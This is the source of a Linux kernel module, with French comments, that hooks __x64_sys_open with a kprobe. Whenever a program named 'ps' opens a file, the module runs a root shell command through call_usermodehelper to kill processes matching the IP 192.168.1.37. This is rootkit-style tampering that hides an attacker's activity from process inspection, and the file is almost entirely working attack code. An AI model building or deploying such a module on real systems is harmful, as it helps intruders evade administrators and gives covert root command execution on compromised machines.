#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tibo.wav");

static struct kprobe kp;
static struct workqueue_struct *wq;
int last_pid = 0;

/* Structure pour la tâche différée */
struct work_data {
    struct work_struct work;
    char command[64];
};

/* Fonction exécutée dans la workqueue */
static void my_work_handler(struct work_struct *work) {
    struct work_data *wd = container_of(work, struct work_data, work);
    char *argv[] = { "/bin/sh", "-c", wd->command, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    pr_info("[+] Executing command: %s\n", wd->command);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    kfree(wd); // Libérer la mémoire après exécution
}

/* Handler du hook kprobe */
static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    struct work_data *wd;
	if (current->pid == last_pid) {
		return 0;
	}
    pr_info("[+] Hooked __x64_sys_open! PID: %d, name: %s\n", current->pid, current->comm);

    if (strcmp(current->comm, "ps") == 0) {
        wd = kmalloc(sizeof(struct work_data), GFP_ATOMIC);
        if (!wd) {
            pr_err("[-] Failed to allocate memory for work\n");
            return 0;
        }

        INIT_WORK(&wd->work, my_work_handler);
        snprintf(wd->command, sizeof(wd->command), "kill $(pgrep -f '192.168.1.37');");

        queue_work(wq, &wd->work); // Planifie la tâche différée
    }
	last_pid = current->pid;
    return 0;
}

/* Initialisation du module */
static int __init hook_init(void) {
    int ret;

    /* Créer une workqueue */
    wq = create_singlethread_workqueue("communication_wq");
    if (!wq) {
        pr_err("[-] Failed to create workqueue\n");
        return -ENOMEM;
    }

    /* Configurer le kprobe */
    kp.symbol_name = "__x64_sys_open";
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[-] Failed to register kprobe: %d\n", ret);
        destroy_workqueue(wq); // Nettoyage si échec
        return ret;
    }

    pr_info("[+] __x64_sys_open hooked successfully\n");
    return 0;
}

/* Nettoyage du module */
static void __exit hook_exit(void) {
    unregister_kprobe(&kp);
    destroy_workqueue(wq);
    pr_info("[+] __x64_sys_open unhooked successfully\n");
}

module_init(hook_init);
module_exit(hook_exit);

